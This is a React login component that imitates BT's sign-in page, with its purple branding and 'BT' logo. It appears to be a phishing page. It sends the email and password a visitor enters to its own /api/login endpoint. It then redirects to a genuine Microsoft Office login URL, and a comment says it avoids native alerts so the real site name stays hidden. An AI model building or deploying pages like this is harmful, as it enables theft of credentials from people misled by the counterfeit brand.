'use client';

import { useState } from 'react';

export default function LoginScreen() {
  const [step, setStep] = useState<1 | 2>(1);
  const [mode, setMode] = useState<'login' | 'register'>('login');

  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  const [emailFocused, setEmailFocused] = useState(false);
  const [passwordFocused, setPasswordFocused] = useState(false);

  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  // Validate Step 1 (Email / Username)
  const handleNextStep = () => {
    setError('');
    if (!email.trim()) {
      setError(
        mode === 'login'
          ? 'Enter a valid email or username.'
          : 'Enter a valid email address.'
      );
      return;
    }
    setStep(2);
  };

  // Submit Login or Register
  const handleSubmit = async () => {
    if (!password) {
      setError('Please enter your password.');
      return;
    }

    setError('');
    setIsLoading(true);

    try {
      if (mode === 'login') {
        const res = await fetch('/api/login', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            email,
            password,
          }),
        });

        const data = await res.json();

        if (!res.ok) {
          setError(data.message || 'Invalid login details.');
          setIsLoading(false);
          return;
        }

        // Save token
        localStorage.setItem('token', data.token);

        // Show inline success message instead of native alert (browser prefixes site name)
        setSuccess(data.message || 'Login successful');
        // Delay redirect so user can briefly see the success banner
        setTimeout(() => {
          window.location.href = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=639140509807666052.MmNlOTRiYWQtYTg0ZC00ZjdkLTk3YjktYTRhMzM0NTM5MGI2NzYxOTExZTEtY2JhYS00ZjBiLTk3ODItMjgyNzI5NDc5NjEw&ui_locales=en-GB&mkt=en-GB&client-request-id=761ee8b0-1e5f-4d7d-b018-3662ba8755c6&state=6qAn1j0NYsiJ0AZ-IaTyZWKIbD7mQnBlUQAhZPlA54ZX2IhyUiSDp755IP-fZQ40wXisDSp08BtMF8yfS4e4ipHV0DyVMfsCN3M2FlDuJ0SG8D06UxobPpUr8ZwPmN-TfqN7KSEFpUymNCdxWJYV72BkQLfC0xKGz1zlF1NSXdunrUVD_SJ-SfY8zlWlVw8UAchy4cpQTG6Yc7zJElQrkGXXxrKTlfKZQmM84vO3HfFVgvxXbRdu2H8kgykxa0fAFPjizsuItpcyt7Xuitez_KkWQVWmRG5oTbY_wgLSa5mkrmpzjonSB07IxL5ALxv6yHScoVBs27aCw1h8pR1G8sx8ZRmvegylpk_dIS6-XzPVH7jfy9vB4XDUpxE1fXyY3YnVJZdKkMAcmdzqqsTlpM8yzDWQE3G5mZ0NUmRS2IQ&x-client-SKU=ID_NET8_0&x-client-ver=8.14.0.0';
        }, 1400);

      } else {
        // Register Mode
        const res = await fetch('/api/register', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            email,
            password,
          }),
        });

        const data = await res.json();

        if (!res.ok) {
          setError(data.message || 'Failed to create account.');
          setIsLoading(false);
          return;
        }

        // Auto-login upon successful registration
        const loginRes = await fetch('/api/login', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            email,
            password,
          }),
        });

        const loginData = await loginRes.json();

          if (loginRes.ok) {
          localStorage.setItem('token', loginData.token);
          // Show inline success message instead of native alert
          setSuccess('Account created and logged in successfully.');
          setTimeout(() => {
            window.location.href = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=639140509807666052.MmNlOTRiYWQtYTg0ZC00ZjdkLTk3YjktYTRhMzM0NTM5MGI2NzYxOTExZTEtY2JhYS00ZjBiLTk3ODItMjgyNzI5NDc5NjEw&ui_locales=en-GB&mkt=en-GB&client-request-id=761ee8b0-1e5f-4d7d-b018-3662ba8755c6&state=6qAn1j0NYsiJ0AZ-IaTyZWKIbD7mQnBlUQAhZPlA54ZX2IhyUiSDp755IP-fZQ40wXisDSp08BtMF8yfS4e4ipHV0DyVMfsCN3M2FlDuJ0SG8D06UxobPpUr8ZwPmN-TfqN7KSEFpUymNCdxWJYV72BkQLfC0xKGz1zlF1NSXdunrUVD_SJ-SfY8zlWlVw8UAchy4cpQTG6Yc7zJElQrkGXXxrKTlfKZQmM84vO3HfFVgvxXbRdu2H8kgykxa0fAFPjizsuItpcyt7Xuitez_KkWQVWmRG5oTbY_wgLSa5mkrmpzjonSB07IxL5ALxv6yHScoVBs27aCw1h8pR1G8sx8ZRmvegylpk_dIS6-XzPVH7jfy9vB4XDUpxE1fXyY3YnVJZdKkMAcmdzqqsTlpM8yzDWQE3G5mZ0NUmRS2IQ&x-client-SKU=ID_NET8_0&x-client-ver=8.14.0.0';
          }, 1400);
        } else {
          setError('Account created, but automatic login failed. Please sign in manually.');
          setMode('login');
          setStep(1);
          setPassword('');
        }
      }
    } catch (err) {
      console.error(err);
      setError('An unexpected error occurred. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  const handleCancel = () => {
    setStep(1);
    setMode('login');
    setEmail('');
    setPassword('');
    setShowPassword(false);
    setError('');
  };

  return (
    <div className="min-h-screen w-full flex flex-col md:flex-row bg-white font-sans selection:bg-[#5500a5]/20">
      
      {/* LEFT PANE - Desktop Only */}
      <div className="hidden md:flex md:w-1/2 bg-[#f3f4f6] items-center justify-center border-r border-gray-100 select-none">
        {/* Large BT Circle Logo */}
        <div className="w-[136px] h-[136px] rounded-full border-[5px] border-[#5500a5] bg-white flex items-center justify-center shadow-sm transition-transform duration-300 hover:scale-105">
          <span className="text-[46px] font-extrabold text-[#5500a5] tracking-tight">
            BT
          </span>
        </div>
      </div>

      {/* RIGHT PANE - Form Content (Desktop + Mobile) */}
      <div className="w-full md:w-1/2 flex items-center justify-center p-6 md:p-12 min-h-screen md:min-h-0 bg-white">
        <div className="w-full max-w-[380px] flex flex-col items-start">
          
          {/* Mobile-Only BT Logo (aligned top-left) */}
          <div className="block md:hidden mb-8 self-start select-none">
            <div className="w-16 h-16 rounded-full border-[3px] border-[#5500a5] bg-white flex items-center justify-center shadow-xs">
              <span className="text-xl font-extrabold text-[#5500a5] tracking-tight">
                BT
              </span>
            </div>
          </div>

          {/* Heading */}
          <h1 className="text-[32px] font-bold text-[#1f1f1f] mb-6 leading-tight tracking-tight select-none">
            {mode === 'login' ? 'Log in' : 'Create account'}
          </h1>

          {/* Error Message */}
          {error && (
            <div className="w-full mb-4 px-4 py-3 rounded-lg bg-red-50 border border-red-200 text-sm font-medium text-red-600 animate-fadeIn">
              {error}
            </div>
          )}

          {/* Success Message */}
          {success && (
            <div className="w-full mb-4 px-4 py-3 rounded-lg bg-green-50 border border-green-200 text-sm font-medium text-green-700 animate-fadeIn">
              {success}
            </div>
          )}

          {/* STEP 1: Email / Username */}
          {step === 1 && (
            <div className="w-full flex flex-col items-start animate-fadeIn">
              <label className="text-sm font-semibold text-[#1f1f1f] mb-2 select-none">
                {mode === 'login' ? 'Email or username' : 'Email address'}
              </label>
              
              <input
                type="text"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                onFocus={() => setEmailFocused(true)}
                onBlur={() => setEmailFocused(false)}
                className="w-full h-[48px] px-4 rounded-lg border text-base text-[#1f1f1f] bg-white transition-all outline-none placeholder-gray-400"
                style={{
                  borderColor: emailFocused ? '#0070f3' : '#757575',
                  boxShadow: emailFocused
                    ? '0 0 0 4px rgba(0, 112, 243, 0.12)'
                    : 'none',
                }}
                placeholder=""
                onKeyDown={(e) => {
                  if (e.key === 'Enter') handleNextStep();
                }}
              />

              <button
                onClick={handleNextStep}
                className="w-full h-[48px] mt-6 rounded-full bg-[#5500a5] hover:bg-[#440088] text-white font-semibold text-base transition-all duration-150 flex items-center justify-center shadow-xs cursor-pointer select-none active:scale-[0.98]"
              >
                Next
              </button>

              {mode === 'login' && (
                <a
                  href="#"
                  className="mt-6 text-sm font-semibold text-[#5500a5] hover:underline hover:opacity-90 transition-all select-none"
                >
                  Forgot your password?
                </a>
              )}

              {/* Toggle Mode Area */}
              <div className="w-full mt-10 border-t border-gray-200 pt-8 flex flex-col items-start">
                <p className="text-sm font-medium text-[#1f1f1f] mb-4 select-none">
                  {mode === 'login'
                    ? "Don't have an account?"
                    : 'Already have an account?'}
                </p>
                <button
                  onClick={() => {
                    setMode(mode === 'login' ? 'register' : 'login');
                    setError('');
                  }}
                  className="w-full h-[48px] rounded-full border-2 border-[#5500a5] text-[#5500a5] bg-white hover:bg-[#fbf8ff] font-semibold text-base transition-all duration-150 flex items-center justify-center cursor-pointer select-none active:scale-[0.98]"
                >
                  {mode === 'login' ? 'Create account' : 'Log in'}
                </button>
              </div>
            </div>
          )}

          {/* STEP 2: Password */}
          {step === 2 && (
            <div className="w-full flex flex-col items-start animate-fadeIn">
              
              {/* High-Fidelity Silhouette Avatar & Email Display Row */}
              <div className="w-full flex items-start mb-6 select-none">
                <div className="mr-3 mt-1 shrink-0 text-gray-700">
                  <svg className="w-6 h-6" fill="none" stroke="currentColor" strokeWidth="1.5" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M15.75 6a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0zM4.501 20.118a7.5 7.5 0 0114.998 0A17.933 17.933 0 0112 21.75c-2.676 0-5.216-.584-7.499-1.632z" />
                  </svg>
                </div>
                <div className="flex flex-col items-start leading-tight">
                  <span className="text-[17px] text-[#1f1f1f] font-normal font-sans">
                    {email}
                  </span>
                  <button
                    onClick={() => {
                      setStep(1);
                      setShowPassword(false);
                    }}
                    className="text-[14px] font-semibold text-[#5500a5] underline mt-1 hover:opacity-85 cursor-pointer select-none"
                  >
                    Change email or username
                  </button>
                </div>
              </div>

              <label className="text-sm font-semibold text-[#1f1f1f] mb-2 select-none">
                Password
              </label>
              
              <input
                type={showPassword ? 'text' : 'password'}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onFocus={() => setPasswordFocused(true)}
                onBlur={() => setPasswordFocused(false)}
                className="w-full h-[48px] px-4 rounded-lg border text-base text-[#1f1f1f] bg-white transition-all outline-none"
                style={{
                  borderColor: passwordFocused ? '#0070f3' : '#757575',
                  boxShadow: passwordFocused
                    ? '0 0 0 4px rgba(0, 112, 243, 0.12)'
                    : 'none',
                }}
                placeholder=""
                onKeyDown={(e) => {
                  if (e.key === 'Enter') handleSubmit();
                }}
                autoFocus
              />

              {/* Show Password Checkbox */}
              <div className="w-full flex items-center mt-3.5 mb-6 select-none">
                <input
                  type="checkbox"
                  id="show-password"
                  checked={showPassword}
                  onChange={(e) => setShowPassword(e.target.checked)}
                  className="w-5 h-5 accent-[#5500a5] border-gray-300 rounded cursor-pointer focus:ring-0"
                />
                <label
                  htmlFor="show-password"
                  className="ml-3 text-sm font-semibold text-[#1f1f1f] cursor-pointer"
                >
                  Show password
                </label>
              </div>

              <button
                onClick={handleSubmit}
                disabled={isLoading}
                className="w-full h-[48px] rounded-full bg-[#5500a5] hover:bg-[#440088] text-white font-semibold text-base transition-all duration-150 flex items-center justify-center shadow-xs cursor-pointer select-none disabled:opacity-50 disabled:cursor-not-allowed active:scale-[0.98]"
              >
                {isLoading ? (
                  <span className="flex items-center gap-2">
                    <svg
                      className="animate-spin h-5 w-5 text-white"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        className="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        strokeWidth="4"
                      />
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                      />
                    </svg>
                    Processing...
                  </span>
                ) : (
                  'Next'
                )}
              </button>

              {mode === 'login' && (
                <a
                  href="#"
                  className="mt-6 text-sm font-semibold text-[#5500a5] hover:underline hover:opacity-90 transition-all select-none"
                >
                  Forgot your password?
                </a>
              )}
            </div>
          )}

          {/* Bottom Cancel Link */}
          <button
            onClick={handleCancel}
            className="mt-8 text-sm font-semibold text-[#1f1f1f] hover:underline cursor-pointer select-none transition-all hover:opacity-80 self-start"
          >
            Cancel
          </button>

        </div>
      </div>

    </div>
  );
}